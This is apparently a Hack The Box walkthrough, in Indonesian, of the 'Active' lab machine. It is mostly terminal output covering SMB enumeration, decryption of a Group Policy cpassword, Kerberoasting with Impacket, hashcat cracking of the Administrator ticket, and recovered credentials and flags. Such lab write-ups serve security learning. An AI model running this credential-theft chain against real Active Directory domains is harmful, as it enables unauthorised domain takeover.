
**Nmap RESULT:**

```bash
┌─[aexon@parrot]─[~]
└──╼ $sudo nmap -sCV -p- 10.10.10.100 --min-rate 1000 -Pn
[sudo] password for aexon: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 13:54 WIB
Warning: 10.10.10.100 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.100
Host is up (0.31s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-06 06:54:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49172/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-06T06:55:04
|_  start_date: 2024-09-06T03:48:33
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: -2m40s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.96 seconds

```

---
**SMB ENUM**


```bash
┌─[✗]─[aexon@parrot]─[~]
└──╼ $smbclient -L \\10.10.10.100
Password for [WORKGROUP\aexon]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

mari kita cek di Repilication

```bash
┌─[aexon@parrot]─[~]
└──╼ $smbmap -H 10.10.10.100 -R Replication --depth 10
[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replication\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	active.htb
	.\Replication\active.htb\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	scripts
	.\Replication\active.htb\DfsrPrivate\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	ConflictAndDeleted
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	Deleted
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	Installing
	.\Replication\active.htb\Policies\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	{6AC1786C-016F-11D2-945F-00C04fB984F9}
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	fr--r--r--               23 Sat Jul 21 17:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	USER
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	fr--r--r--              119 Sat Jul 21 17:38:11 2018	GPE.INI
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	Preferences
	fr--r--r--             2788 Sat Jul 21 17:38:11 2018	Registry.pol
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	Windows NT
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	SecEdit
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	fr--r--r--             1098 Sat Jul 21 17:38:11 2018	GptTmpl.inf
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	Groups
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	fr--r--r--              533 Sat Jul 21 17:38:11 2018	Groups.xml
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	fr--r--r--               22 Sat Jul 21 17:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	USER
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	Microsoft
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	Windows NT
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	SecEdit
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\*
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 17:37:44 2018	..
	fr--r--r--             3722 Sat Jul 21 17:38:11 2018	GptTmpl.inf
```

di sini saya curiga dengan file Groups.xml, mari kita download ke local computer kita.
hasil dari download file Groups.xml

```bash
┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Active]
└──╼ $cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

mari kita crak password. 

```bash
┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Active]
└──╼ $gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

---
**User Flag**

setelah decrypt hash nya mari kita menggunakan netexec, untuk evil-winrm

username: SVC_TGS
password: GPPstillStandingStrong2k18

dan gagal, kita coba gunakan smb,dan hasil nya:

```bash
┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Active]
└──╼ $netexec smb 10.10.10.100 -u SVC_TGS  -p 'GPPstillStandingStrong2k18' --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ   
```

```bash
┌─[✗]─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Active]
└──╼ $smbclient //10.10.10.100/Users -U SVC_TGS
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 21:39:20 2018
  ..                                 DR        0  Sat Jul 21 21:39:20 2018
  Administrator                       D        0  Mon Jul 16 17:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 12:06:44 2009
  Default                           DHR        0  Tue Jul 14 13:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 12:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 11:57:55 2009
  Public                             DR        0  Tue Jul 14 11:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 22:16:32 2018

		5217023 blocks of size 4096. 278548 blocks available
smb: \> cd SVC_TGS/Desktop
smb: \SVC_TGS\Desktop\> dir
  .                                   D        0  Sat Jul 21 22:14:42 2018
  ..                                  D        0  Sat Jul 21 22:14:42 2018
  user.txt                           AR       34  Fri Sep  6 10:49:45 2024

		5217023 blocks of size 4096. 278548 blocks available
smb: \SVC_TGS\Desktop\> type user.txt
type: command not found
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> 

┌─[✗]─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Active]
└──╼ $cat user.txt 
e9fac5d5e0b122112140ff9f10f251c0
```

---

**ROOT**

Di sini saya exploit Kerberoast nya


```bash
(root) ┌─[✗]─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Active/root]
└──╼ $python3 GetUserSPNs.py  -request -dc-ip 10.10.10.100 active.htb/SVC_TGS  
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 02:06:40.351723  2024-09-06 10:49:47.672571             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$dc4e6963c1ace956e8cb8da0605e1ce7$4e24f8f48322662422ef61079a749864761444eb7f7063c917de0c8e655487821078fe97c6408257870e78fb8a7ae57a4bf0d2aaff65fd85fc131b580c89395d082d2ad9542866806ef931d49492c0a646aee6d3ba6d7e5a286d56bb4929c93bb3829e7487567db5b243f40f85d67d2a629c67c702a2ea0b500f9a290be38441c582a86a3eef26af7e25c5e39adf0532e724224de35cc74ff313c4d9bb5cf0d419cacfeeb3e66ebcb5ab6aabce909cacf2c4a05fae9b3ea1e47b3007cc9709ae667eaf0d94c51e058a5115cfd6ec39d5c94b5a4a9139ce8602f7e10baf471990ff47bdca41772de49b0cd7326b4ae598783533f9135d893e890df41e2a655b4172151199abaa09690ad86ccabf93d614291b655078d1118600bf2e9c631c8a9610d8cceb1775a233fd704ac8739a248251f8e07d2a5e85eadc91ab59b199b0d3f3f9d0ab1214bf08ad99d7f55d644317af7570ed39661f429103fe2832228b588a49d3adf758712dac73646b6de06a07a352b7fb520e57f37492a8b0592b3b758ff164f4b3df1273fd290c3a79adf4eb1f12e635d94bc21fa21f1e977907740decc8ae20d60fe12d521adfc3acecff5f2ff0721c2e96c32c8f3dd7cc869fd9ffac40519136d90e58bacb11bd01d5129970b3c75a7cd7824118c8c3a5b50abea3f5bbcb6fb0c7c92d9b6f6c1ad367d48b24c0e2eba8884e1fda496afa87ab9bfb7015ac41f6167122e640619eb15105629a7cdaaa7b6172dfd15662f764c88fee2ff186981853e40905205743ccb7ccc73ead91687630a513f1295aeb2192304ae22cec518cec56d740cd54ccad2368420164d99c6927843c34ad6c721ed5709c25d735ce749cdd591386e37c69a03f59b506313186a97c44b3d6c2021f1cc46dd5d0fdb6a9c97b5f8006fd1f509a95a5478b6955b1114db70cf905ca52a7aa84ef9026a787f27c5df4cf79d46e959cef64b75fedabe725911ba4a60cf58e846262f685d9d770def77ae521715b27878ceaa2e2297e9f27283eb8e72cff38d347d6e23e49ab84ebc5b036c976ef962d05328fe2c97536c67e78487083e535c663b8d2f923819588a4c19d4381632c2bcb1dd11af520ca318cc8e7ca78b64b84b2aa7b25cd4f515c6f6b1648366eedffe860bbbf64ab9d6a70fba44d5ad82fc96057c1150145c6c35f23e3e3d7022cc6dc744b8a0ab23d13482dad4b3cb37c7222f14ba8a0dddeab4f67c72db1ce6fa24c078c522cb07dde84b9f6

```


cracking password


```bash
┌─[✗]─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Active]
└──╼ $hashcat -m 13100 root_hash.txt ~/tools/wordlist/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-skylake-avx512-Intel(R) Core(TM) i3-1005G1 CPU @ 1.20GHz, 2784/5633 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /home/aexon/tools/wordlist/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$dc4e6963c1ace956e8cb8da0605e1ce7$4e24f8f48322662422ef61079a749864761444eb7f7063c917de0c8e655487821078fe97c6408257870e78fb8a7ae57a4bf0d2aaff65fd85fc131b580c89395d082d2ad9542866806ef931d49492c0a646aee6d3ba6d7e5a286d56bb4929c93bb3829e7487567db5b243f40f85d67d2a629c67c702a2ea0b500f9a290be38441c582a86a3eef26af7e25c5e39adf0532e724224de35cc74ff313c4d9bb5cf0d419cacfeeb3e66ebcb5ab6aabce909cacf2c4a05fae9b3ea1e47b3007cc9709ae667eaf0d94c51e058a5115cfd6ec39d5c94b5a4a9139ce8602f7e10baf471990ff47bdca41772de49b0cd7326b4ae598783533f9135d893e890df41e2a655b4172151199abaa09690ad86ccabf93d614291b655078d1118600bf2e9c631c8a9610d8cceb1775a233fd704ac8739a248251f8e07d2a5e85eadc91ab59b199b0d3f3f9d0ab1214bf08ad99d7f55d644317af7570ed39661f429103fe2832228b588a49d3adf758712dac73646b6de06a07a352b7fb520e57f37492a8b0592b3b758ff164f4b3df1273fd290c3a79adf4eb1f12e635d94bc21fa21f1e977907740decc8ae20d60fe12d521adfc3acecff5f2ff0721c2e96c32c8f3dd7cc869fd9ffac40519136d90e58bacb11bd01d5129970b3c75a7cd7824118c8c3a5b50abea3f5bbcb6fb0c7c92d9b6f6c1ad367d48b24c0e2eba8884e1fda496afa87ab9bfb7015ac41f6167122e640619eb15105629a7cdaaa7b6172dfd15662f764c88fee2ff186981853e40905205743ccb7ccc73ead91687630a513f1295aeb2192304ae22cec518cec56d740cd54ccad2368420164d99c6927843c34ad6c721ed5709c25d735ce749cdd591386e37c69a03f59b506313186a97c44b3d6c2021f1cc46dd5d0fdb6a9c97b5f8006fd1f509a95a5478b6955b1114db70cf905ca52a7aa84ef9026a787f27c5df4cf79d46e959cef64b75fedabe725911ba4a60cf58e846262f685d9d770def77ae521715b27878ceaa2e2297e9f27283eb8e72cff38d347d6e23e49ab84ebc5b036c976ef962d05328fe2c97536c67e78487083e535c663b8d2f923819588a4c19d4381632c2bcb1dd11af520ca318cc8e7ca78b64b84b2aa7b25cd4f515c6f6b1648366eedffe860bbbf64ab9d6a70fba44d5ad82fc96057c1150145c6c35f23e3e3d7022cc6dc744b8a0ab23d13482dad4b3cb37c7222f14ba8a0dddeab4f67c72db1ce6fa24c078c522cb07dde84b9f6:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...84b9f6
Time.Started.....: Fri Sep  6 14:32:31 2024 (8 secs)
Time.Estimated...: Fri Sep  6 14:32:39 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/aexon/tools/wordlist/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1394.9 kH/s (1.21ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> Thelittlemermaid
Hardware.Mon.#1..: Temp: 72c Util: 88%

Started: Fri Sep  6 14:32:16 2024
Stopped: Fri Sep  6 14:32:41 2024

```

mendapatkan root flag. saya mencoba dengan evil-winrm gagal, tetapi ketika saya mencoba dengan smb berhasil.

```bash
(root) ┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Active/root]
└──╼ $netexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.10.100    445    DC               C$              READ,WRITE      Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ,WRITE      Logon server share 
SMB         10.10.10.100    445    DC               Users           READ 
```


```bash
(root) ┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Active/root]
└──╼ $smbclient //10.10.10.100/Users -U Administrator
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 21:39:20 2018
  ..                                 DR        0  Sat Jul 21 21:39:20 2018
  Administrator                       D        0  Mon Jul 16 17:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 12:06:44 2009
  Default                           DHR        0  Tue Jul 14 13:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 12:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 11:57:55 2009
  Public                             DR        0  Tue Jul 14 11:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 22:16:32 2018

		5217023 blocks of size 4096. 278548 blocks available
smb: \> cd Administrator/Desktop
smb: \Administrator\Desktop\> get root.txt
getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
smb: \Administrator\Desktop\> exit
(root) ┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Active/root]
└──╼ $cat root.txt 
55e4e6e6f6816cc96cfba1720914d74b

```